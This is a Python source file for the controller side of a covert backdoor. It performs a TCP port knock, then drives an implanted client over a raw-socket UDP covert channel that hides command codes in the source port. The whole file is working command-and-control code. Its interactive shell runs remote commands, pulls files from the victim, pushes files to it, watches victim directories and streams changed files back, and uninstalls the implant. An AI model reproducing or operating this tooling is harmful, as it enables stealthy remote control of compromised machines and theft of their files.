#!/usr/bin/env python3
"""
Commander Program - Integrated Port Knock + Raw Socket Covert Channel
Performs TCP port knock, then sends commands via UDP raw socket covert channel.

REQUIRES: Root/Administrator privileges for raw sockets
Usage: sudo python3 commander.py <target_host>
"""
import os
import socket
import struct
import time
import sys
import threading
from enum import IntEnum
from raw_socket_protocol import RawSocketProtocol

# Configuration
KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
COMMAND_PORT   = 8888                 # UDP port for covert channel
RECEIVED_DIR   = "received_files/"   # Directory to save files from client

# Commands that expect a response from the client
COMMANDS_WITH_RESPONSE = frozenset([
    # populated below after CommandType is defined
])


class CommandType(IntEnum):
    """Commands encoded in UDP src-port field"""
    DISCONNECT          = 0x1234
    UNINSTALL           = 0x2345
    TRANSFER_TO_CLIENT  = 0x3456
    TRANSFER_FROM_CLIENT = 0x4567
    RUN_COMMAND         = 0x5678
    FILE_WATCH          = 0x6789  # push: client sends modified files
    FILE_DELETE         = 0x7890  # push: client notifies file deletion
    STOP_WATCH          = 0x8901  # commander � client: stop the file watcher
    ACK                 = 0x9ABC
    ERROR               = 0xABCD


# Commands that require the commander to listen for a response
COMMANDS_WITH_RESPONSE = frozenset([
    CommandType.RUN_COMMAND,
    CommandType.TRANSFER_FROM_CLIENT,
    CommandType.UNINSTALL,
    CommandType.FILE_WATCH,   # initial ACK + then ongoing push stream
])

# Packet types the commander expects to receive (filters out its own sent packets)
RESPONSE_COMMANDS = frozenset([
    int(CommandType.ACK),
    int(CommandType.ERROR),
    int(CommandType.FILE_WATCH),
    int(CommandType.FILE_DELETE),
])


class Commander:
    """
    Commander that:
    1. Performs TCP port knock sequence
    2. Sends commands via UDP raw socket covert channel
    """

    def __init__(self, target_host):
        # Resolve localhost before storing
        if target_host == "localhost":
            target_host = "127.0.0.1"
        self.target_host = target_host
        self.knock_ports = KNOCK_SEQUENCE
        self.command_port = COMMAND_PORT
        self.source_ip = self.get_local_ip()
        self.protocol = RawSocketProtocol()
        self._pending_get_filename = None
        self._watch_thread = None        # background thread receiving pushed watch packets
        self._watch_stop   = threading.Event()
        os.makedirs(RECEIVED_DIR, exist_ok=True)

    def get_local_ip(self):
        """Get the local IP that routes toward the target."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def perform_port_knock(self):
        """Perform TCP port knock sequence."""
        print("\n" + "=" * 60)
        print("PHASE 1: TCP Port Knock Authentication")
        print("=" * 60)
        print(f"Target:   {self.target_host}")
        print(f"Sequence: {self.knock_ports}")
        print()

        for port in self.knock_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                print(f"[+] Knocking on TCP port {port}...", end=" ", flush=True)
                sock.connect((self.target_host, port))
                sock.close()
                print("")
            except Exception as e:
                print(f" ({e})")
            time.sleep(0.5)

        print("\n[+] Port knock sequence complete!")
        print("[*] Authorization granted for covert channel")
        print("=" * 60)
        time.sleep(1)

    def send_covert_command(self, command_type, payload=b'', context=None):
        """
        Send a command via the raw socket covert channel.

        For commands that expect a response the receive socket is opened
        BEFORE the command packet is sent, eliminating the race condition
        where the first response packet arrives before we start listening.

        context: optional dict passed through to display_response()
                 e.g. {'filename': 'secret.txt'} for TRANSFER_FROM_CLIENT
        """
        print(f"\n[�] Sending covert command: {command_type.name}")
        print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
        print(f"    Transport: UDP port {self.command_port}")
        if payload and len(payload) < 100:
            preview = payload[:50].decode('utf-8', errors='replace')
            print(f"    Payload:   {preview}")

        needs_response = command_type in COMMANDS_WITH_RESPONSE

        if needs_response:
            self.protocol.prepare_recv_socket()
            time.sleep(0.1)  # give the kernel time to attach the BPF filter


        success = self.protocol.send_packet(
            self.source_ip,
            self.target_host,
            self.command_port,
            command_type,
            payload
        )

        if not success:
            print(f"[] Failed to send packet")
            return False

        print(f"[] Packet sent successfully")

        if needs_response:
            if command_type == CommandType.FILE_WATCH:
                # Wait for the initial ACK from client, then keep listening in background
                print("[*] Waiting for watch confirmation...")
                response = self.receive_response(timeout=5)
                if response and response['type'] == int(CommandType.ACK):
                    msg = response['payload'].decode('utf-8', errors='replace')
                    print(f"[] Client confirmed: {msg}")
                    self._start_watch_listener()
                else:
                    print("[!] No confirmation from client  watch may not have started")
            else:
                print("[*] Waiting for response...")
                response = self.receive_response()
                if response:
                    self.display_response(response, context=context)
                else:
                    print("[!] No response received (timeout)")

        return success

    def receive_response(self, timeout=5):
        """Receive a response from the client via the covert channel."""
        response = self.protocol.receive_data(
            self.target_host,
            self.command_port,
            timeout
        )
        return response  # may be None on timeout

    # ------------------------------------------------------------------ #
    #  File watch listener                                                 #
    # ------------------------------------------------------------------ #

    def _start_watch_listener(self):
        """Start a background thread that receives pushed file-watch packets."""
        self._stop_watch_listener()  # stop any existing listener first
        self._watch_stop.clear()
        self._watch_thread = threading.Thread(
            target=self._watch_listener_loop,
            daemon=True
        )
        self._watch_thread.start()
        print("[*] Watch listener started. Type 'stopwatch' to stop.")

    def _watch_mode(self):
        """
        Block the interactive session in watch-only mode.
        Only 'stopwatch' or Ctrl+C exits this loop.
        All other input is rejected with a reminder.
        """
        print("\n" + "=" * 60)
        print("  WATCH MODE ACTIVE  commander is locked")
        print("  Type 'stopwatch' to stop watching and resume commands.")
        print("=" * 60)

        while True:
            try:
                user_input = input("watching> ").strip().lower()

                if user_input == 'stopwatch':
                    # Tell client to stop its watcher
                    self.protocol.send_packet(
                        self.source_ip,
                        self.target_host,
                        self.command_port,
                        CommandType.STOP_WATCH,
                        b''
                    )
                    self._stop_watch_listener()
                    print("[*] Watch stopped. Resuming normal command mode.")
                    print("=" * 60)
                    break

                elif user_input == '':
                    continue

                else:
                    print(f"[!] Watch mode is active  only 'stopwatch' is accepted.")

            except KeyboardInterrupt:
                print("\n[*] Interrupted  stopping watch and sending disconnect...")
                self.protocol.send_packet(
                    self.source_ip,
                    self.target_host,
                    self.command_port,
                    CommandType.STOP_WATCH,
                    b''
                )
                self._stop_watch_listener()
                try:
                    self.send_covert_command(CommandType.DISCONNECT)
                except Exception:
                    pass
                raise  # re-raise so the outer loop also exits

    def _stop_watch_listener(self):
        """Signal the background watch listener to stop and wait for it."""
        if self._watch_thread and self._watch_thread.is_alive():
            self._watch_stop.set()
            self._watch_thread.join(timeout=3)
        self._watch_thread = None
        self._watch_stop.clear()

    def _watch_listener_loop(self):
        """
        Background thread: open a raw socket and process FILE_WATCH /
        FILE_DELETE packets pushed by the client until _watch_stop is set.
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.settimeout(1.0)  # short timeout so we can check _watch_stop
        except Exception as e:
            print(f"[!] Watch listener: could not open socket: {e}")
            return

        # Per-transfer reassembly state (client pushes one file at a time)
        chunks        = {}
        expected_total = None
        current_cmd   = None

        try:
            while not self._watch_stop.is_set():
                try:
                    packet, addr = sock.recvfrom(65535)
                except socket.timeout:
                    continue

                if addr[0] != self.target_host:
                    continue

                parsed = self.protocol.parse_udp_packet(packet)
                if not parsed:
                    continue
                if parsed['dst_port'] != self.command_port:
                    continue
                # Only accept push-type packets; ignore our own outbound commands
                if parsed['command'] not in RESPONSE_COMMANDS:
                    continue

                seq   = parsed['seq']
                data  = parsed['data']
                total = parsed['total']
                cmd   = parsed['command']

                # New transfer starting
                if expected_total is None:
                    expected_total = total
                    current_cmd    = cmd
                    chunks         = {}

                chunks[seq] = data

                if expected_total and len(chunks) >= expected_total:
                    # Verify no gaps
                    expected_seqs = set(range(1, expected_total + 1))
                    if set(chunks.keys()) != expected_seqs:
                        missing = expected_seqs - set(chunks.keys())
                        print(f"\n[!] Watch listener: missing seqs {missing}  dropping")
                        chunks = {}
                        expected_total = None
                        current_cmd    = None
                        continue

                    # Reassemble
                    raw = b''.join(chunks[i] for i in sorted(chunks))
                    payload = raw[:-1] if (expected_total * 2) > len(raw) else raw

                    # Reset state
                    chunks        = {}
                    expected_total = None

                    if current_cmd == int(CommandType.FILE_WATCH):
                        self._handle_watch_file(payload)
                    elif current_cmd == int(CommandType.FILE_DELETE):
                        self._handle_watch_delete(payload)

                    current_cmd = None

        finally:
            sock.close()

    def _handle_watch_file(self, payload):
        """Save a pushed file from the client into RECEIVED_DIR."""
        try:
            filename_len  = struct.unpack('!H', payload[:2])[0]
            filename      = payload[2:2 + filename_len].decode('utf-8')
            filedata      = payload[2 + filename_len:]
            save_path     = os.path.join(RECEIVED_DIR, filename)
            with open(save_path, 'wb') as f:
                f.write(filedata)
            print(f"\n[�] Watch: received '{filename}' ({len(filedata)} bytes) � {save_path}")
        except Exception as e:
            print(f"\n[!] Watch: could not save file: {e}")

    def _handle_watch_delete(self, payload):
        """Delete a file from RECEIVED_DIR because it was deleted on the client."""
        try:
            filename  = payload.decode('utf-8').strip()
            del_path  = os.path.join(RECEIVED_DIR, filename)
            if os.path.exists(del_path):
                os.remove(del_path)
                print(f"\n[] Watch: deleted '{filename}' from {RECEIVED_DIR}")
            else:
                print(f"\n[~] Watch: delete notice for '{filename}' "
                      f"(not in {RECEIVED_DIR}, ignoring)")
        except Exception as e:
            print(f"\n[!] Watch: could not delete file: {e}")

    def display_response(self, response, context=None):
        """Pretty-print a response dict from receive_data()."""
        print("\n" + "=" * 60)
        if response['type'] == int(CommandType.ACK):
            # File transfer response  save to disk
            if context and context.get('filename'):
                filename = os.path.basename(context['filename'])
                save_path = os.path.join(RECEIVED_DIR, filename)
                try:
                    with open(save_path, 'wb') as f:
                        f.write(response['payload'])
                    print(f"FILE RECEIVED: {filename}")
                    print("=" * 60)
                    print(f"  Saved to : {save_path}")
                    print(f"  Size     : {len(response['payload'])} bytes")
                except Exception as e:
                    print(f"FILE RECEIVE ERROR:")
                    print("=" * 60)
                    print(f"  Could not save {save_path}: {e}")
            else:
                # Plain command output (RUN_COMMAND, UNINSTALL, etc.)
                print("COMMAND OUTPUT:")
                print("=" * 60)
                output = response['payload'].decode('utf-8', errors='replace')
                print(output if output else "(no output)")
        elif response['type'] == int(CommandType.ERROR):
            print("ERROR:")
            print("=" * 60)
            error = response['payload'].decode('utf-8', errors='replace')
            print(error)
        else:
            print(f"UNKNOWN RESPONSE TYPE: 0x{response['type']:04X}")
            print("=" * 60)
            print(response['payload'])
        print("=" * 60)

    def interactive_session(self):
        """Interactive command session."""
        print("\n" + "=" * 60)
        print("Commander - Port Knock + Covert Channel")
        print("=" * 60)
        print(f"Target: {self.target_host}:{self.command_port}")
        print(f"Source: {self.source_ip}")
        print("=" * 60)

        self.perform_port_knock()

        print("\n" + "=" * 60)
        print("PHASE 2: Covert Channel Command Interface")
        print("=" * 60)
        print("\nAvailable Commands:")
        print("  knock                 - Re-authenticate via port knock")
        print("  disconnect            - Disconnect from client (0x1234)")
        print("  uninstall             - Uninstall from client (0x2345)")
        print("  send <file>           - Transfer file to client (0x3456)")
        print("  get <file>            - Transfer file from client (0x4567)")
        print("  run <command>         - Run command on client (0x5678)")
        print("  watch <dir>           - Watch directory on client (0x6789)")
        print("                          (locks commander until 'stopwatch' is typed)")
        print("  exit                  - Exit commander")
        print("=" * 60)
        print()

        while True:
            try:
                user_input = input("covert> ").strip()

                if not user_input:
                    continue

                parts = user_input.split(maxsplit=1)
                cmd  = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ''

                if cmd == 'exit':
                    print("[*] Exiting commander...")
                    break

                elif cmd == 'knock':
                    self.perform_port_knock()

                elif cmd == 'disconnect':
                    self._stop_watch_listener()
                    self.send_covert_command(CommandType.DISCONNECT)
                    print("[*] Disconnect sent  authorization revoked on client")
                    print("[*] Exiting commander...")
                    break

                elif cmd == 'uninstall':
                    self.send_covert_command(CommandType.UNINSTALL)
                    print("[*] Client will clean up and terminate")

                elif cmd == 'send':
                    if not args:
                        print("[!] Usage: send <filepath>")
                        continue
                    try:
                        with open(args, 'rb') as f:
                            filedata = f.read()
                        filename       = os.path.basename(args)
                        filename_bytes = filename.encode('utf-8')
                        filename_len   = len(filename_bytes)
                        print(f"[*] Transferring: {filename} ({len(filedata)} bytes)")
                        # Payload: filename_length (2 bytes) | filename | filedata
                        payload = struct.pack('!H', filename_len) + filename_bytes + filedata
                        self.send_covert_command(CommandType.TRANSFER_TO_CLIENT, payload)
                    except Exception as e:
                        print(f"[!] Error reading file: {e}")

                elif cmd == 'get':
                    if not args:
                        print("[!] Usage: get <filepath>")
                        continue
                    self.send_covert_command(
                        CommandType.TRANSFER_FROM_CLIENT,
                        args.encode('utf-8'),
                        context={'filename': args}  # used by display_response to save the file
                    )

                elif cmd == 'run':
                    if not args:
                        print("[!] Usage: run <command>")
                        continue
                    self.send_covert_command(
                        CommandType.RUN_COMMAND,
                        args.encode('utf-8')
                    )

                elif cmd == 'watch':
                    if not args:
                        print("[!] Usage: watch <directory>")
                        continue
                    self.send_covert_command(
                        CommandType.FILE_WATCH,
                        args.encode('utf-8')
                    )
                    # Block the interactive loop until stopwatch is issued
                    if self._watch_thread and self._watch_thread.is_alive():
                        self._watch_mode()

                else:
                    print(f"[!] Unknown command: {cmd}")

                time.sleep(0.3)

            except KeyboardInterrupt:
                print("\n[*] Interrupted  sending disconnect...")
                self._stop_watch_listener()
                try:
                    self.send_covert_command(CommandType.DISCONNECT)
                except Exception:
                    pass
                break

            except Exception as e:
                print(f"[!] Error: {e}")


def main():
    print("=" * 60)
    print("Commander Program")
    print("=" * 60)
    print("Requires: Root/Administrator privileges for raw sockets")
    print()

    if len(sys.argv) < 2:
        print("Usage: sudo python3 commander.py <target_host>")
        print("\nExample:")
        print("  sudo python3 commander.py 192.168.1.100")
        sys.exit(1)

    commander = Commander(sys.argv[1])

    try:
        commander.interactive_session()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()